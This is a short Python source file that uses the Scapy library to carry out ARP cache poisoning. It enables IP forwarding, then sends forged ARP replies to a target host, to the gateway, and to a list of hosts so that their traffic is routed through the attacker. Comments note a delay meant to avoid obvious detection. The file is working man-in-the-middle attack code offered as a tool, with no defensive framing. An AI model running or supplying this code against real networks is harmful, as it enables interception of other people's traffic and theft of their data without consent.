from time import sleep
from scapy.all import ARP, send
from scapy.layers.l2 import getmacbyip

class arpPoison:
    def __init__(self, gateway, target):
        self.gatewayIP = gateway
        self.targetIP = target

    # Needed for routing capabilities, defaults to 0 on reboot
    def setup(self):
        file = open("/proc/sys/net/ipv4/ip_forward", "w")
        file.write("1")
        file.close()

    # Spoofs packet to host that the MAC address of router is that of the attacker 
    def poisonHost(self):
        spoofPacket = ARP(pdst = self.targetIP, psrc = self.gatewayIP, hwdst = getmacbyip(self.targetIP), op = 2)
        send(spoofPacket, verbose = 0)
        # Stops for 10 seconds to prevent network congestion, alongside a small delay to prevent obvious detection
        sleep(10)
    
    # Spoofs packet to router that the MAC address of target is that of the attacker 
    def poisonRouter(self):
        spoofPacket = ARP(pdst = self.gatewayIP, psrc = self.targetIP, hwdst = getmacbyip(self.gatewayIP), op = 2)
        send(spoofPacket, verbose = 0)
        # Stops for 10 seconds to prevent network congestion, alongside a small delay to prevent obvious detection
        sleep(10)

    # Iterates through list to send malicious ARP packets to all IPs
    def poisonListOfHosts(self, listOfHosts):
        for ip in listOfHosts:
            # Spoofing for host
            spoofPacket = ARP(pdst = ip, psrc = self.gatewayIP, hwdst = getmacbyip(ip), op = 2)
            send(spoofPacket, verbose = 0)
            sleep(5)
            
            # Spoofing for router
            spoofPacket = ARP(pdst = self.gatewayIP, psrc = ip, hwdst = getmacbyip(self.gatewayIP), op = 2)
            send(spoofPacket, verbose = 0)
            sleep(5)